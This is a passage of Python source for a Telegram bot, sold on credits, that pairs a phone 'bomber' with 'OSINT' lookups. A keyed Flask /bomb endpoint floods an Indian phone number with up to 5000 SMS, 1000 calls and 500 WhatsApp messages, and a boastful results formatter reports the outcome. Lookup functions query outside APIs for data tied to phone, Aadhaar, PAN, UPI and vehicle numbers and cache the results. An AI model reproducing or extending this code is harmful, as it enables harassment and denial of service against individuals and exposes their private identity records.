        return {'success': False, 'msg': str(e)}

def stop_brutal_bomb(bomber_id):
    """Stop the brutal bomber"""
    if bomber_id in bomber_stop_flags:
        bomber_stop_flags[bomber_id] = True
        return {'success': True, 'message': 'Bomber stopped!'}
    return {'success': False, 'message': 'Bomber not found'}

def format_brutal_result(bomber_id):
    """Format brutal bomber result with stats"""
    if bomber_id not in active_bombers:
        return "<b>❌ Bomber not found!</b>"
    
    info = active_bombers[bomber_id]
    if not info['completed'] or not info['result']:
        return "<b>⏳ Bomber still running...</b>"
    
    r = info['result']
    IST = ZoneInfo("Asia/Kolkata")
    now = datetime.now(IST).strftime("%d %b %Y %I:%M %p")
    
    success_rate = float(r['success_rate'].replace('%', ''))
    if success_rate >= 80:
        intensity = "💀💀💀💀💀 EXTREME DEATH ☠️☠️☠️☠️☠️"
        skulls = "💀💀💀💀💀"
    elif success_rate >= 60:
        intensity = "💀💀💀💀 NUCLEAR ☢️☢️☢️☢️"
        skulls = "💀💀💀💀"
    elif success_rate >= 40:
        intensity = "💀💀💀 KILLER 🔪🔪🔪"
        skulls = "💀💀💀"
    elif success_rate >= 20:
        intensity = "💀💀 MODERATE"
        skulls = "💀💀"
    else:
        intensity = "💀 WEAK"
        skulls = "💀"
    
    text = f"""
<b>💣💀 BRUTAL BOMBER RESULT</b>
━━━━━━━━━━━━━━━━━━
📱 <b>Target:</b> <code>+91{info['phone']}</code>
🕐 <b>Time:</b> {now}
━━━━━━━━━━━━━━━━━━
📊 <b>FINAL STATISTICS:</b>
├ 📡 Total APIs: <b>{len(ALL_APIS)}</b>
├ ✅ Successful: <b>{r['total_success']}</b>
├ ❌ Failed: <b>{r['total_attempts'] - r['total_success']}</b>
├ 📈 Success Rate: <b>{r['success_rate']}</b>
└ 🔄 Rounds: <b>{r['rounds']}</b>
━━━━━━━━━━━━━━━━━━
📞 <b>BREAKDOWN:</b>
├ 📞 Calls: <b>{r['total_calls']}</b> 🎯 Target: 1000
├ 📱 SMS: <b>{r['total_sms']}</b> 🎯 Target: 5000
└ 💬 WhatsApp: <b>{r['total_wa']}</b> 🎯 Target: 500
━━━━━━━━━━━━━━━━━━
💀 <b>Intensity:</b> {skulls} {intensity}
⏱️ <b>Duration:</b> <b>{r['duration']}s</b> ({r['duration']//60}m {r['duration']%60}s)
🔑 <b>Key:</b> <code>MADX</code>
━━━━━━━━━━━━━━━━━━
{skulls} <b>🔥 TARGET +91{info['phone']} IS BRUTALLY BOMBED!</b>
"""
    return text

# ==================== FLASK ROUTES ====================

@app.route('/')
def home():
    return {
        "status": "🔥 ULTIMATE OSINT BOT WITH BRUTAL BOMBER 🔥",
        "version": "6.0",
        "bot": "Running ✅",
        "brutal_bomber": {
            "total_apis": len(ALL_APIS),
            "key": "MADX",
            "duration": "5 Minutes",
            "targets": "5000 SMS | 1000 Calls | 500 WhatsApp",
            "endpoint": "/bomb?key=MADX&num=9876543210"
        },
        "made_by": "Unknown"
    }

@app.route('/health')
def health():
    try:
        db_size = os.path.getsize('bot.db') // 1024 if os.path.exists('bot.db') else 0
        return {
            "status": "healthy",
            "db_size_kb": db_size,
            "apis": len(ALL_APIS),
            "key": "MADX",
            "active_bombers": len([b for b in active_bombers if not active_bombers[b].get('completed', False)]),
            "made_by": "Unknown"
        }
    except Exception:
        return {"status": "healthy"}

@app.route('/bomb', methods=['GET'])
def bomb_api():
    phone = flask_request.args.get('num')
    key = flask_request.args.get('key')
    
    if not key or key != "MADX":
        return jsonify({"status": "error", "message": "Invalid or missing key. Use: MADX"}), 401
    
    if not phone or len(phone) != 10 or not phone.isdigit():
        return jsonify({"status": "error", "message": "Phone must be 10 digits"}), 400
    
    result = start_brutal_bomb(phone)
    
    if result.get('success'):
        return jsonify({
            "status": "success",
            "bomber_id": result['bomber_id'],
            "phone": phone,
            "message": result['message'],
            "total_apis": len(ALL_APIS),
            "duration": "5 Minutes",
            "target": "5000 SMS | 1000 Calls | 500 WhatsApp"
        })
    else:
        return jsonify({"status": "error", "message": result.get('msg', 'Unknown error')}), 500

@app.route('/bomb/stop', methods=['GET'])
def bomb_stop_api():
    bomber_id = flask_request.args.get('id')
    if not bomber_id:
        return jsonify({"status": "error", "message": "bomber_id required"}), 400
    
    result = stop_brutal_bomb(bomber_id)
    return jsonify(result)

def run_web():
    app.run(host='0.0.0.0', port=10000, use_reloader=False, threaded=True)

# ==================== ENVIRONMENT ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    sys.exit(1)

try:
    OWNER_ID = int(os.environ.get("OWNER_ID", "7545664963"))
except ValueError:
    OWNER_ID = 7545664963

FREE_CREDITS = 5
DAILY_CREDITS = 1
REFERRAL_CREDITS = 1
BOT_CREDIT = "⚡ ʙᴏᴛ ᴍᴀᴅᴇ ʙʏ : Unknown"

# ==================== DATABASE ====================
def init_db():
    global conn, c
    conn = sqlite3.connect('bot.db', check_same_thread=False, timeout=30)
    c = conn.cursor()
    
    c.executescript('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            join_date TEXT,
            referrer INTEGER,
            credits INTEGER DEFAULT 10,
            is_blocked INTEGER DEFAULT 0,
            is_premium INTEGER DEFAULT 0,
            premium_until TEXT,
            total_searches INTEGER DEFAULT 0,
            last_active TEXT,
            money INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY,
            added_by INTEGER,
            added_date TEXT,
            is_owner INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS referrals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referrer INTEGER,
            referred INTEGER,
            date TEXT
        );
        
        CREATE TABLE IF NOT EXISTS search_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            search_type TEXT,
            query TEXT,
            search_date TEXT,
            result TEXT
        );
        
        CREATE TABLE IF NOT EXISTS daily_claims (
            user_id INTEGER,
            claim_date TEXT,
            PRIMARY KEY (user_id, claim_date)
        );
        
        CREATE TABLE IF NOT EXISTS redeem_codes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT UNIQUE,
            credits INTEGER,
            max_uses INTEGER,
            used_count INTEGER DEFAULT 0,
            created_by INTEGER,
            created_at TEXT,
            expires_at TEXT,
            is_active INTEGER DEFAULT 1
        );
        
        CREATE TABLE IF NOT EXISTS redeemed_users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            code TEXT,
            redeemed_at TEXT
        );
        
        CREATE TABLE IF NOT EXISTS bomber_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_number TEXT,
            sms_sent INTEGER DEFAULT 0,
            calls_sent INTEGER DEFAULT 0,
            status TEXT DEFAULT 'running',
            started_at TEXT,
            stopped_at TEXT
        );
        
        CREATE TABLE IF NOT EXISTS cache_number (
            number TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_aadhar (
            aadhar TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_upi (
            upi TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_instagram (
            username TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_ifsc (
            ifsc TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_vehicle (
            rc_number TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_gst (
            gst_number TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_pan (
            pan_number TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_pak (
            number TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_pincode (
            pincode TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_ff (
            uid TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS cache_tg_user (
            identifier TEXT PRIMARY KEY,
            data TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            hit_count INTEGER DEFAULT 0
        );
        
        CREATE TABLE IF NOT EXISTS clone_bots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            token TEXT UNIQUE,
            status TEXT DEFAULT 'pending',
            requested_at TEXT,
            approved_at TEXT,
            is_manually_stopped INTEGER DEFAULT 0
        );
    ''')
    conn.commit()
    
    try:
        c.execute("INSERT OR IGNORE INTO admins (user_id, added_by, added_date, is_owner) VALUES (?, ?, ?, ?)",
                  (OWNER_ID, OWNER_ID, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 1))
        conn.commit()
    except Exception:
        pass
    
    try:
        c.execute("INSERT OR IGNORE INTO users (user_id, username, first_name, join_date, credits, last_active) VALUES (?, ?, ?, ?, ?, ?)",
                  (OWNER_ID, 'owner', 'Bot Owner', datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 999999, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
    except Exception:
        pass
    
    print("✅ Database initialized!")

# ==================== CACHE FUNCTIONS ====================

def cache_get(table, key):
    try:
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute(f"SELECT data, hit_count FROM {table} WHERE {table.split('_')[1]} = ?", (key,))
        row = c.fetchone()
        if row:
            c.execute(f"UPDATE {table} SET hit_count = hit_count + 1 WHERE {table.split('_')[1]} = ?", (key,))
            conn.commit()
            conn.close()
            return json.loads(row[0])
        conn.close()
        return None
    except Exception:
        return None

def cache_set(table, key, data):
    try:
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        data_json = json.dumps(data, default=str)
        c.execute(f"INSERT OR REPLACE INTO {table} ({table.split('_')[1]}, data) VALUES (?, ?)", (key, data_json))
        conn.commit()
        conn.close()
        return True
    except Exception:
        return False

# ==================== API FUNCTIONS ====================

def get_number_info(number):
    clean = re.sub(r'[^\d]', '', str(number))
    if len(clean) < 10:
        return {'success': False, 'msg': 'Invalid number'}
    
    cached = cache_get('cache_number', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://nitin-developer-api-paid.nitinshab43.workers.dev/api?action=num&number={clean}&key=JAANI"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') and data.get('result'):
                result = {
                    'success': True,
                    'data': data['result'],
                    'total_records': len(data['result']),
                    'source': 'nitin_api'
                }
                cache_set('cache_number', clean, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_aadhar_info(aadhar):
    clean = re.sub(r'\s+', '', str(aadhar))
    if not re.match(r'^\d{12}$', clean):
        return {'success': False, 'msg': 'Invalid Aadhar'}
    
    cached = cache_get('cache_aadhar', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://nitin-developer-api-paid.nitinshab43.workers.dev/api?action=aadhar&aadhar={clean}&key=JAANI"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') and data.get('result'):
                result = {
                    'success': True,
                    'data': data['result'],
                    'total_records': len(data['result']),
                    'source': 'nitin_api'
                }
                cache_set('cache_aadhar', clean, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_upi_info(upi):
    if '@' not in upi:
        return {'success': False, 'msg': 'Invalid UPI ID'}
    
    cached = cache_get('cache_upi', upi)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://nitin-developer-api-paid.nitinshab43.workers.dev/api?action=upiinfo&upi={upi}&key=JAANI"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') and data.get('result'):
                result = {
                    'success': True,
                    'data': data['result'],
                    'total_records': len(data['result']),
                    'source': 'nitin_api'
                }
                cache_set('cache_upi', upi, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_instagram_info(username):
    clean = username.replace('@', '').strip()
    if len(clean) < 2:
        return {'success': False, 'msg': 'Invalid username'}
    
    cached = cache_get('cache_instagram', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://instagram-api.vercel.app/api/info?username={clean}"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data:
                user_data = data.get('user', data)
                result = {
                    'success': True,
                    'data': [{
                        'username': user_data.get('username', clean),
                        'full_name': user_data.get('full_name', ''),
                        'bio': user_data.get('bio', ''),
                        'followers': user_data.get('follower_count', user_data.get('followers', 0)),
                        'following': user_data.get('following_count', user_data.get('following', 0)),
                        'posts': user_data.get('media_count', user_data.get('posts', 0)),
                        'verified': user_data.get('is_verified', user_data.get('verified', False)),
                        'is_private': user_data.get('is_private', user_data.get('private', False)),
                    }],
                    'source': 'instagram_api'
                }
                cache_set('cache_instagram', clean, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_ifsc_info(ifsc):
    clean = ifsc.upper().strip()
    if len(clean) != 11:
        return {'success': False, 'msg': 'Invalid IFSC'}
    
    cached = cache_get('cache_ifsc', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://ifsc-api.vercel.app/api?action=ifsc&code={clean}&key=free"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') and data.get('result'):
                result = {
                    'success': True,
                    'data': data['result'],
                    'source': 'ifsc_api'
                }
                cache_set('cache_ifsc', clean, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_vehicle_info(vehicle):
    clean = re.sub(r'\s+', '', vehicle).upper()
    if len(clean) < 8:
        return {'success': False, 'msg': 'Invalid RC number'}
    
    cached = cache_get('cache_vehicle', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://vehicle-api.vercel.app/api?action=rc&number={clean}&key=free"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') and data.get('result'):
                result = {
                    'success': True,
                    'data': data['result'],
                    'source': 'vehicle_api'
                }
                cache_set('cache_vehicle', clean, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_gst_info(gst):
    clean = gst.upper().strip()
    if len(clean) < 10:
        return {'success': False, 'msg': 'Invalid GST'}
    
    cached = cache_get('cache_gst', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://gst-api.vercel.app/api?action=gst&number={clean}&key=free"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') and data.get('result'):
                result = {
                    'success': True,
                    'data': data['result'],
                    'source': 'gst_api'
                }
                cache_set('cache_gst', clean, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_pan_info(pan):
    clean = pan.upper().strip()
    if not re.match(r'^[A-Z]{5}[0-9]{4}[A-Z]$', clean):
        return {'success': False, 'msg': 'Invalid PAN format'}
    
    cached = cache_get('cache_pan', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://pan-api.vercel.app/api?action=pan&number={clean}&key=free"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') and data.get('result'):
                result = {
                    'success': True,
                    'data': data['result'],
                    'source': 'pan_api'
                }
                cache_set('cache_pan', clean, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_pak_num_info(number):
    clean = re.sub(r'[^\d]', '', str(number))
    if len(clean) < 10:
        return {'success': False, 'msg': 'Invalid number'}
    
    cached = cache_get('cache_pak', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://pak-api.vercel.app/api?action=pak&number={clean}&key=free"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') and data.get('result'):
                result = {
                    'success': True,
                    'data': data['result'],
                    'source': 'pak_api'
                }
                cache_set('cache_pak', clean, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_pincode_info(pincode):
    clean = re.sub(r'[^\d]', '', str(pincode))
    if len(clean) != 6:
        return {'success': False, 'msg': 'Invalid pincode'}
    
    cached = cache_get('cache_pincode', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://pincode-api.vercel.app/api?action=pincode&code={clean}&key=free"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') and data.get('result'):
                result = {
                    'success': True,
                    'data': data['result'],
                    'source': 'pincode_api'
                }
                cache_set('cache_pincode', clean, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_ff_info(uid):
    clean = re.sub(r'[^\d]', '', str(uid))
    if len(clean) < 5:
        return {'success': False, 'msg': 'Invalid UID'}
    
    cached = cache_get('cache_ff', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    try:
        url = f"https://ff-api.vercel.app/api?action=ff&uid={clean}&key=free"
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') and data.get('result'):
                result = {
                    'success': True,
                    'data': data['result'],
                    'source': 'ff_api'
                }
                cache_set('cache_ff', clean, result)
                return result
    except Exception:
        pass
    
    if cached:
        return cached
    
    return {'success': False, 'msg': 'No data found'}

def get_hitek_num_info(number):
    clean = re.sub(r'[^\d]', '', str(number))
    if len(clean) < 10:
        return {'success': False, 'msg': 'Invalid number'}
    
    cached = cache_get('cache_number', clean)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    result = get_number_info(clean)
    if result.get('success'):
        return result
    
    return {'success': False, 'msg': 'No data found'}

def get_hitek_full_info(query):
    if len(query) < 2:
        return {'success': False, 'msg': 'Invalid query'}
    
    cache_key = hashlib.md5(query.encode()).hexdigest()[:16]
    cached = cache_get('cache_number', cache_key)
    if cached:
        cached['_from_cache'] = True
        cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
        return cached
    
    if re.search(r'\d', query):
        clean_num = re.sub(r'[^\d]', '', query)
        if len(clean_num) >= 10:
            result = get_number_info(clean_num)
            if result.get('success'):
                cache_set('cache_number', cache_key, result)
                return result
    
    try:
        clean_username = query.replace('@', '').strip()
        tg_result = get_tg_user_info(clean_username)
        if tg_result.get('success'):
            cache_set('cache_number', cache_key, tg_result)
            return tg_result
    except Exception:
        pass
    
    return {'success': False, 'msg': 'No data found'}

def get_tg_user_info(identifier):
    try:
        clean = str(identifier).strip()
        if clean.startswith('@'):
            clean = clean[1:]
        
        cached = cache_get('cache_tg_user', clean.lower())
        if cached:
            cached['_from_cache'] = True
            cached['_cache_time'] = datetime.now().strftime("%d %b %Y %I:%M %p")
            return cached
        
        result = {'success': False, 'msg': 'User not found'}
        photo_file_id = None
        
        if clean.isdigit():
            try:
                chat = bot.get_chat(int(clean))
                result = {
                    'success': True,
                    'data': [{
                        'user_id': chat.id,
                        'username': chat.username or '',
                        'first_name': chat.first_name or '',
                        'last_name': chat.last_name or '',
                        'full_name': f"{chat.first_name or ''} {chat.last_name or ''}".strip(),
                        'bio': getattr(chat, 'bio', '') or getattr(chat, 'description', '') or '',
                        'is_bot': getattr(chat, 'is_bot', False),
                        'type': getattr(chat, 'type', 'user')
                    }],
                    'source': 'tg_api_id'
                }
                try:
                    photos = bot.get_user_profile_photos(int(clean), limit=1)
                    if photos and photos.photos:
                        photo_file_id = photos.photos[0][-1].file_id
                        result['photo_file_id'] = photo_file_id
                except Exception:
                    pass
                cache_set('cache_tg_user', clean.lower(), result)
                return result
            except Exception:
                pass
        
        try:
            chat = bot.get_chat(f"@{clean}")
            result = {
                'success': True,
                'data': [{
                    'user_id': chat.id,
                    'username': chat.username or clean,
                    'first_name': chat.first_name or '',
                    'last_name': chat.last_name or '',
                    'full_name': f"{chat.first_name or ''} {chat.last_name or ''}".strip(),
                    'bio': getattr(chat, 'bio', '') or getattr(chat, 'description', '') or '',
                    'is_bot': getattr(chat, 'is_bot', False),
                    'type': getattr(chat, 'type', 'user')
                }],
                'source': 'tg_api_username'
            }
            try:
                photos = bot.get_user_profile_photos(chat.id, limit=1)
                if photos and photos.photos:
                    photo_file_id = photos.photos[0][-1].file_id
                    result['photo_file_id'] = photo_file_id
            except Exception:
                pass
            cache_set('cache_tg_user', clean.lower(), result)
            return result
        except Exception:
            pass
        
        try:
            chat = bot.get_chat(clean)
            result = {
                'success': True,
                'data': [{
                    'user_id': chat.id,
                    'username': chat.username or clean,
                    'first_name': chat.first_name or '',
                    'last_name': chat.last_name or '',
                    'full_name': f"{chat.first_name or ''} {chat.last_name or ''}".strip(),
                    'bio': getattr(chat, 'bio', '') or getattr(chat, 'description', '') or '',
                    'is_bot': getattr(chat, 'is_bot', False),
                    'type': getattr(chat, 'type', 'user')
                }],
                'source': 'tg_api_direct'
            }
            try:
                photos = bot.get_user_profile_photos(chat.id, limit=1)
                if photos and photos.photos:
                    photo_file_id = photos.photos[0][-1].file_id
                    result['photo_file_id'] = photo_file_id
            except Exception:
                pass
            cache_set('cache_tg_user', clean.lower(), result)
            return result
        except Exception:
            pass
        
        return result
        
    except Exception as e:
        return {'success': False, 'msg': str(e)}

# ==================== USER FUNCTIONS ====================

def get_user(user_id):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result

def add_user(user_id, username, first_name, referrer=None):
    conn = sqlite3.connect('bot.db', timeout=10)
    c = conn.cursor()
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        c.execute('''
            INSERT OR IGNORE INTO users 
            (user_id, username, first_name, join_date, referrer, credits, last_active) 
            VALUES (?,?,?,?,?,?,?)
        ''', (user_id, username, first_name, date, referrer, FREE_CREDITS, date))
        conn.commit()
        return True
    except Exception:
        return False
    finally:
        conn.close()

def get_credits(user_id):
    if user_id == OWNER_ID:
        return "∞"
    user = get_user(user_id)
    if not user:
        return 0
    return user[5] or 0

def add_credits(user_id, amount):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    try:
        c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
        conn.commit()
        return True
    except Exception:
        return False
    finally:
        conn.close()

def remove_credits(user_id, amount):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    try:
        c.execute("UPDATE users SET credits = credits - ? WHERE user_id = ? AND credits >= ?", (amount, user_id, amount))
        conn.commit()
        return c.rowcount > 0
    except Exception:
        return False
    finally:
        conn.close()

def get_referral_count(user_id):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM referrals WHERE referrer=?", (user_id,))
    result = c.fetchone()[0] or 0
    conn.close()
    return result

def get_money(user_id):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    try:
        c.execute("SELECT money FROM users WHERE user_id=?", (user_id,))
        r = c.fetchone()
        return r[0] if r else 0
    except Exception:
        return 0
    finally:
        conn.close()

def add_money(user_id, amount):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    try:
        c.execute("UPDATE users SET money = money + ? WHERE user_id = ?", (amount, user_id))
        conn.commit()
    finally:
        conn.close()

def remove_money(user_id, amount):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    try:
        c.execute("UPDATE users SET money = money - ? WHERE user_id = ? AND money >= ?", (amount, user_id, amount))
        conn.commit()
        return c.rowcount > 0
    except Exception:
        return False
    finally:
        conn.close()

def claim_daily(user_id):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    today = datetime.now().strftime("%Y-%m-%d")
    try:
        c.execute("SELECT 1 FROM daily_claims WHERE user_id=? AND claim_date=?", (user_id, today))
        if c.fetchone():
            conn.close()
            return False
        c.execute("INSERT INTO daily_claims (user_id, claim_date) VALUES (?,?)", (user_id, today))
        c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (DAILY_CREDITS, user_id))
        conn.commit()
        conn.close()
        return True
    except Exception:
        return False

def save_search_history(user_id, search_type, query, result):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        result_json = json.dumps(result, default=str)[:15000]
        c.execute("INSERT INTO search_history (user_id, search_type, query, search_date, result) VALUES (?,?,?,?,?)",
                  (user_id, search_type, query, timestamp, result_json))
        c.execute("UPDATE users SET total_searches = total_searches + 1, last_active = ? WHERE user_id = ?",
                  (timestamp, user_id))
        conn.commit()
    except Exception:
        pass
    finally:
        conn.close()

def save_bomber_history(user_id, number, sms_sent, calls_sent, status):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        c.execute(
            "INSERT INTO bomber_history (user_id, target_number, sms_sent, calls_sent, status, started_at, stopped_at) VALUES (?,?,?,?,?,?,?)",
            (user_id, number, sms_sent, calls_sent, status, now, now)
        )
        conn.commit()
    except Exception:
        pass
    finally:
        conn.close()

def get_bomber_history(user_id, limit=10):
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    try:
        c.execute(
            "SELECT target_number, sms_sent, calls_sent, status, started_at FROM bomber_history WHERE user_id=? ORDER BY id DESC LIMIT ?",
            (user_id, limit)
        )
        return c.fetchall()
    except Exception:
        return []
    finally:
        conn.close()

# ==================== ADMIN ====================

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    c.execute("SELECT user_id FROM admins WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

# ==================== BOT ====================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# ==================== STATE ====================

user_state = {}
admin_page = {}
bomber_active = {}
paid_bomber_active = {}

# ==================== FORMAT FUNCTIONS ====================

def _DIV():
    return "━━━━━━━━━━━━━━━━━━"

def _esc(v):
    return str(v).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

def format_message(text):
    return f"<blockquote>{text}\n\n{BOT_CREDIT}</blockquote>"

def format_generic_result(data, title, query_label, query_value):
    IST = ZoneInfo("Asia/Kolkata")
    now = datetime.now(IST).strftime("%d %b %Y %I:%M %p")
    
    records = data.get('data', [])
    if not records:
